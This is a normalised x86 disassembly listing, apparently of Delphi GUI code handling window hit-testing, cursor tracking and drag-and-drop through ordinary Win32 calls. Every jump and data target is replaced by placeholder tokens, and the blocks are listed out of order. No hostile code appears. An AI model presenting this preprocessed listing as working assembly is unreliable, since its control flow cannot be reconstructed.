cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4404c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_44052c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_44097c
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43fa98
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_4493d8
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_4493d8
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4493d8
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403430
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_4404c0
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_4493d8
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_4493d8
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_4406c4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_4493d8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4493d8
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_440708
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_43ff20
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_44052c
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_41a468
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_4493d8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_4406c4
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403430
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_447ed0
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_43fe90
sub_440864
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_41a4c4
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_41a358
mov edx edi
mov eax [ rw-data ]
call sub_41a30c
jmp r-xdata
sub_4408c4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_44091c
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4044c8
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_43fa64
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_44097c
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44091c
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_4409a8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_440708
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_44097c
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_4408c4
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_4493d8
mov [ esi ] eax
sub_4409f8
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_4408c4
cmp eax 0x1
sbb eax eax
inc eax
sub_440a34
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_447e3c
test eax eax
je r-xdata
mov eax esi
call sub_447e3c
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_441464
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_41a468
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_41a4c4
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_447e50
mov edi eax
jmp r-xdata
sub_440ac8
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_4409a8
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44ae98
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_4409f8
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_4409f8
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_4426fc
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_4409f8
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4606f8
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_44ae80
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_440a34
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403430
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_44af80
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_44ae98
jmp r-xdata
mov eax [ rw-data ]
call sub_44aff4
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4606f8
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_4426fc
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403430
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403430
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_40809c
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_440d98
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_43ffc4
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44ae98
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_440ac8
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_440f08
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_4410ad
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403430
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403430
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4402cc
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_440d98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4401b4
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_4493d8
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_41900c
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_4426d0
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_41900c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_4410cc
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403430
mov ebx eax
sub_441140
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_44140c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_44139a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_44000c
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033e4
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_4410cc
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_4409f8
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_44aff4
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4413a1
mov eax [ rw-data ]
call sub_403234
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_4599ec
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_443d6c
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_4408c4
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_45d658
sub_4413a1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4033c0
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
sub_441430
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_43fa98
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_441464
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_441430
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_4426fc
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_446c8c
test eax eax
je r-xdata
mov esi eax
sub_4414ac
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_41a30c
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx ] eax
sub_4414d4
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_41a604
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403234
xor eax eax
mov [ ebx ] eax
sub_4414f4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_441524
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_41a82c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4415d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a890
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_4415ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_441760
call sub_403a6c
call sub_403a6c
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a468
mov [ ebp - 0x10 ] eax
